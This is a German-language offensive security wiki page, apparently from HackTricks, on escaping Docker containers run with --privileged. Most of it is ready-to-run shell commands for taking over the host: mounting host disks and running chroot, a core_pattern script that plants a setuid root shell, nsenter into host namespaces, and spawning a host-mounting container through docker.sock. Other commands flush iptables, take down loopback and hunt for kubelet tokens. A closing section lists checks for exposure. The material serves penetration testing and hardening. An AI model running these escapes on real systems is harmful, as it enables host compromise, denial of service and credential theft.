# Aus `--privileged` Containern entkommen

{{#include ../../../banners/hacktricks-training.md}}

## Übersicht

Ein Container, der mit `--privileged` gestartet wurde, ist nicht dasselbe wie ein normaler Container mit ein oder zwei zusätzlichen Berechtigungen. In der Praxis entfernt oder schwächt `--privileged` mehrere der standardmäßigen Runtime-Schutzmechanismen, die normalerweise die Workload von gefährlichen Host-Ressourcen fernhalten. Die genaue Wirkung hängt weiterhin vom Runtime und Host ab, aber bei Docker ist das übliche Ergebnis:

- alle Capabilities werden gewährt
- die Einschränkungen der device cgroup werden aufgehoben
- viele Kernel-Dateisysteme werden nicht mehr schreibgeschützt gemountet
- standardmäßig maskierte procfs-Pfade verschwinden
- seccomp-Filterung ist deaktiviert
- AppArmor-Einschränkungen sind deaktiviert
- SELinux-Isolierung ist deaktiviert oder wird durch ein viel weiter gefasstes Label ersetzt

Wichtig ist, dass ein privilegierter Container normalerweise keinen subtilen Kernel-Exploit benötigt. In vielen Fällen kann er einfach direkt mit Host-Geräten, hostseitig zugänglichen Kernel-Dateisystemen oder Runtime-Schnittstellen interagieren und sich dann in eine Host-Shell pivotieren.

## Was `--privileged` nicht automatisch ändert

`--privileged` tritt **nicht** automatisch den PID-, Network-, IPC- oder UTS-Namespaces des Hosts bei. Ein privilegierter Container kann weiterhin private Namespaces haben. Das bedeutet, einige Escape-Ketten erfordern eine zusätzliche Bedingung wie:

- ein Host-Bind-Mount
- PID-Sharing mit dem Host
- Host-Networking
- sichtbare Host-Geräte
- beschreibbare proc/sys-Schnittstellen

Diese Bedingungen sind in realen Fehlkonfigurationen oft leicht zu erfüllen, aber konzeptionell separat von `--privileged` selbst.

## Fluchtwege

### 1. Host-Festplatte über exponierte Geräte mounten

Ein privilegierter Container sieht normalerweise deutlich mehr Device-Nodes unter `/dev`. Wenn das Host-Blockgerät sichtbar ist, ist der einfachste Escape, es zu mounten und mit `chroot` in das Host-Dateisystem zu wechseln:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Wenn die Root-Partition nicht offensichtlich ist, zuerst das Block-Layout auflisten:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Wenn der praktische Weg darin besteht, einen setuid-Helfer in einem beschreibbaren Host-Mount zu platzieren statt `chroot`, denk daran, dass nicht jedes Dateisystem das setuid-Bit unterstützt. Ein schneller Test auf dem Host ist:
```bash
mount | grep -v "nosuid"
```
Das ist nützlich, weil beschreibbare Pfade auf `nosuid`-Dateisystemen für klassische "drop a setuid shell and execute it later"-Workflows deutlich weniger interessant sind.

Die hier ausgenutzten abgeschwächten Schutzmaßnahmen sind:

- voller Gerätezugriff
- umfangreiche Capabilities, insbesondere `CAP_SYS_ADMIN`

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Host-Bind-Mount einbinden oder wiederverwenden und `chroot`

Wenn das root-Dateisystem des Hosts bereits im Container gemountet ist, oder wenn der Container die nötigen Mounts erstellen kann, weil er privileged ist, ist eine Host-Shell oft nur ein `chroot` entfernt:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Wenn kein host root bind mount existiert, aber host storage erreichbar ist, erstellen Sie einen:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Dieser Pfad nutzt aus:

- geschwächte Mount-Einschränkungen
- volle Capabilities
- fehlende MAC-Isolierung

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Beschreibbare `/proc/sys` oder `/sys` ausnutzen

Eine der großen Folgen von `--privileged` ist, dass die Schutzmechanismen von procfs und sysfs deutlich schwächer werden. Dadurch können host-nahe Kernel-Schnittstellen offengelegt werden, die normalerweise maskiert oder schreibgeschützt gemountet sind.

Ein klassisches Beispiel ist `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Weitere besonders wertvolle Pfade sind:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Dieser Pfad nutzt aus:

- fehlende maskierte Pfade
- fehlende schreibgeschützte Systempfade

Related pages:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Vollständige Capabilities für Mount- oder Namespace-basierte Escapes verwenden

Ein privilegierter Container erhält die Capabilities, die normalerweise aus Standard-Containern entfernt werden, einschließlich `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` und vieler anderer. Das reicht oft aus, um einen lokalen foothold in einen host escape zu verwandeln, sobald eine weitere exponierte Oberfläche existiert.

Ein einfaches Beispiel ist das Einhängen zusätzlicher Dateisysteme und das Betreten von Namespaces:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Wenn host PID ebenfalls geteilt ist, wird der Schritt noch kürzer:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Dieser Pfad missbraucht:

- das standardmäßige privileged Capability-Set
- optionales Teilen des Host-PID-Namespaces

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape durch Runtime-Sockets

Ein privilegierter Container hat häufig Host-Runtime-Zustand oder Sockets sichtbar. Wenn ein Docker-, containerd- oder CRI-O-Socket erreichbar ist, ist der einfachste Ansatz oft, die Runtime-API zu verwenden, um einen zweiten Container mit Zugriff auf den Host zu starten:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Für containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Dieser Pfad missbraucht:

- privileged runtime exposure
- host bind mounts created through the runtime itself

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Entfernen von Nebenwirkungen der Netzwerkisolierung

`--privileged` verbindet nicht automatisch das Host-Netzwerk-Namespace, aber wenn der Container außerdem `--network=host` oder anderen Host-Netzwerkzugriff hat, wird der gesamte Netzwerk-Stack veränderbar:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Das ist nicht immer eine direkte Host-Shell, kann aber zu denial of service, traffic interception oder zum Zugriff auf loopback-only Management-Services führen.

Related pages:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Host-Geheimnisse und Laufzeitzustand lesen

Selbst wenn eine saubere Shell-Escape nicht sofort möglich ist, haben privilegierte Container oft genügend Zugriff, um Host-Geheimnisse, kubelet-Status, Laufzeitmetadaten und Dateisysteme benachbarter Container zu lesen:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Wenn `/var` vom Host gemountet ist oder die Runtime-Verzeichnisse sichtbar sind, kann das bereits für lateral movement oder cloud/Kubernetes credential theft ausreichen, noch bevor eine Host-Shell erlangt wurde.

Related pages:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Prüfungen

Der Zweck der folgenden Befehle ist es, zu bestätigen, welche privileged-container escape families sofort möglich sind.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Was hier interessant ist:

- ein vollständiges Capability-Set, insbesondere `CAP_SYS_ADMIN`
- beschreibbarer Zugriff auf proc/sys
- sichtbare Host-Geräte
- fehlende seccomp- und MAC-Einschränkung
- Runtime-Sockets oder Host-Root-Bind-Mounts

Jeder einzelne Punkt kann für post-exploitation bereits ausreichen. Mehrere zusammen bedeuten normalerweise, dass der Container funktional nur ein oder zwei Befehle von einer Host-Kompromittierung entfernt ist.

## Verwandte Seiten

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
